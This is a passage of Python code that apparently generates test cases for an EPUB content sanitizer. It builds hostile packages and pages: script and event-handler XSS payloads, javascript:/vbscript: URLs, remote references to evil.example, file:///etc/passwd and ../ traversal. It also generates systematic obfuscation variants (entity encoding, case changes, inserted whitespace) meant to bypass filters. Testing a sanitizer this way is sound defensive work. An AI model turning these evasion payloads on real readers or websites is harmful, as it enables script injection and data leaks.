                + f'<html xmlns="{XHTML_NS}"><body><p>x</p></body></html>'
            ).encode(),
            "xml_stylesheet",
        ),
        entry("xsl_undeclared", "OEBPS/e.xsl", xsl, "unexpected_entry"),
        entry("xsl_declared_xml", "OEBPS/e.xsl", xsl, "unexpected_entry", "application/xml"),
        entry("xsl_declared_xml_xml_ext", "OEBPS/e.xml", xsl, "page_in_xml", "application/xml"),
        entry(
            "type_mismatch_png_as_xhtml",
            "OEBPS/e.png",
            TINY_PNG,
            "type_mismatch",
            "application/xhtml+xml",
        ),
        entry(
            "type_mismatch_xhtml_as_image",
            "OEBPS/e.xhtml",
            xhtml("<p>x</p>"),
            "type_mismatch",
            "image/png",
        ),
        Trap(
            "wl_dotdot_declaration",
            "opf-remote",
            epub_bytes(
                xhtml("<p>x</p>"),
                extra=[Member("OEBPS/e.dat", pad_comment)],
                opf_extra='<item id="e" href="../../OEBPS/e.dat" media-type="application/xhtml+xml"/>',
            ),
            "refused",
            "OEBPS/content.opf",
            "remote_reference",
        ),
        entry(
            "font_with_svg_table_is_fine",
            "OEBPS/f.otf",
            b"OTTO\x00\x0c" + b"x" * 2000 + f'<svg xmlns="{SVG_NS}"><g/></svg>'.encode(),
            "",
            "font/otf",
        ),
        entry(
            "font_bad_magic", "OEBPS/f.woff", b"<html><script>1</script></html>", "magic_mismatch"
        ),
        package("metadata_link", '<link rel="cover" href="https://evil.example/c.png"/>'),
        package(
            "refines_remote", '<meta refines="https://evil.example/x" property="role">aut</meta>'
        ),
        package("xml_base", '<meta xml:base="//evil.example/" property="x">a</meta>'),
        package(
            "page_element", f'<h:script xmlns:h="{XHTML_NS}">alert(1)</h:script>', "page_in_xml"
        ),
        Trap(
            "wl_opf_pi",
            "xsl-pi",
            epub_bytes(
                xhtml("<p>x</p>"),
                opf_bytes=opf().replace(b"<package", pi.encode() + b"<package", 1),
            ),
            "refused",
            "OEBPS/content.opf",
            "processing_instruction",
        ),
        Trap(
            "wl_container_pi",
            "xsl-pi",
            zip_bytes(
                [
                    Member("mimetype", b"application/epub+zip", False),
                    Member("META-INF/container.xml", pi.encode() + CONTAINER),
                    Member("OEBPS/content.opf", opf()),
                ]
            ),
            "refused",
            "META-INF/container.xml",
            "processing_instruction",
        ),
        Trap(
            "wl_opf_outside_root",
            "opf-remote",
            epub_bytes(
                xhtml("<p>x</p>"),
                opf_extra='<item id="r" href="../../x.png" media-type="image/png"/>',
            ),
            "refused",
            "OEBPS/content.opf",
            "remote_reference",
        ),
        Trap(
            "wl_item_conflicting_types",
            "disguise",
            epub_bytes(
                xhtml("<p>x</p>"),
                opf_extra='<item id="a" href="e.dat" media-type="image/png"/><item id="b" href="e.dat" media-type="text/html"/>',
            ),
            "refused",
            "OEBPS/content.opf",
            "type_mismatch",
        ),
    ]
    for label, href in {
        "protocol_relative": "//evil/x.png",
        "upper_scheme": "HTTPS://evil/x.png",
        "unc": "\\\\host\\share\\x.png",
        "entity_scheme": "&#x68;ttps://evil/x.png",
        "split_entity": "h&#x74;tps://evil/x",
        "encoded_scheme": "https%3A//evil/x",
        "leading_space": " https://evil/x",
        "file": "file:///etc/passwd",
        "rooted": "/api/x",
        "dotdot": "../../x.png",
    }.items():
        cases.append(hostile_item(label, href))
    return cases


def base_traps() -> tuple[Trap, ...]:
    return tuple(
        _scripts()
        + _handlers()
        + _script_urls()
        + _frames()
        + _remote()
        + _svg_cases()
        + _css()
        + _entities_and_xml()
        + _standalone_files()
        + _archives()
        + _review_cases()
        + _whitelist_cases()
    )


# --- Mutations -----------------------------------------------------------------------------------


def _case_variants(word: str) -> Iterator[str]:
    yield word.upper()
    yield word.capitalize()
    yield "".join(c.upper() if i % 2 else c for i, c in enumerate(word))
    yield "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(word))


def _entity_variants(word: str) -> Iterator[str]:
    yield "".join(f"&#{ord(c)};" for c in word)
    yield "".join(f"&#x{ord(c):x};" for c in word)
    yield "".join(f"&#x{ord(c):X};" for c in word)
    yield "".join(f"&#{ord(c):07d};" for c in word)
    yield word[0] + "".join(f"&#{ord(c)};" for c in word[1:])
    yield "".join(f"&#{ord(c)};" if i % 2 else c for i, c in enumerate(word))


def _split_variants(word: str) -> Iterator[str]:
    for filler in ("&#9;", "&#10;", "&#13;", "&#9;&#10;&#13;", " "):
        yield word[:4] + filler + word[4:]
        yield filler + word
    yield "&#x200B;&#xAD;&#xA0;" + word
    yield "&#x0A;".join(word)


def _scheme_variants(scheme: str) -> Iterator[str]:
    seen: set[str] = set()
    for gen in (_case_variants, _entity_variants, _split_variants):
        for variant in gen(scheme):
            if variant not in seen:
                seen.add(variant)
                yield variant


def mutation_traps() -> tuple[Trap, ...]:
    """The same vectors under other letter cases, entity encodings and inserted whitespace."""
    out: list[Trap] = []
    n = 0
    for scheme in ("javascript", "vbscript"):
        for variant in _scheme_variants(scheme):
            n += 1
            out.append(_page(f"mut_scheme_{n}", "mutation", f'<a href="{variant}:alert(1)">x</a>'))
            out.append(
                _page(f"mut_scheme_img_{n}", "mutation", f'<img src="{variant}:alert(1)" alt=""/>')
            )
    for variant in _scheme_variants("data"):
        n += 1
        out.append(_page(f"mut_data_{n}", "mutation", f'<a href="{variant}:text/html,x">x</a>'))
    for tag in ("script", "iframe", "object", "embed", "form", "base", "foreignObject"):
        for variant in _case_variants(tag):
            n += 1
            out.append(_page(f"mut_tag_{n}", "mutation", f"<{variant}>x</{variant}>"))
            out.append(_page(f"mut_tag_svg_{n}", "mutation", _svg(f"<{variant}>x</{variant}>")))
    for attr in ("onerror", "onclick", "onload", "onmouseover", "onfocus"):
        for variant in _case_variants(attr):
            n += 1
            out.append(_page(f"mut_handler_{n}", "mutation", f'<p {variant}="alert(1)">x</p>'))
            out.append(
                _page(f"mut_handler_svg_{n}", "mutation", _svg(f'<g {variant}="alert(1)"/>'))
            )
    for variant in _scheme_variants("url"):
        n += 1
        out.append(
            _page(
                f"mut_css_{n}",
                "mutation",
                f'<p style="background:{variant}(http://evil.example/)">x</p>',
            )
        )
    for variant in _entity_variants("http"):
        n += 1
        out.append(
            _page(
                f"mut_remote_{n}", "mutation", f'<img src="{variant}://evil.example/p.png" alt=""/>'
            )
        )
    for variant in _case_variants("@import"):
        n += 1
        out.append(
            _page(
                f"mut_import_{n}",
                "mutation",
                "<p>x</p>",
                f"<style>{variant} url(http://evil.example/x.css);</style>",
            )
        )
    return tuple(out)


@cache
def all_traps() -> tuple[Trap, ...]:
    return base_traps() + mutation_traps()


VECTOR_FAMILIES: Final = (
    "script", "handler", "javascript-url", "data-url", "iframe", "object", "embed", "form", "base",
    "meta-refresh", "link-remote", "svg", "css", "remote-resource", "xxe", "entity-bomb", "archive",
    "disguise", "opf-remote", "xsl-pi", "outbound-link", "mutation",
)  # fmt: skip
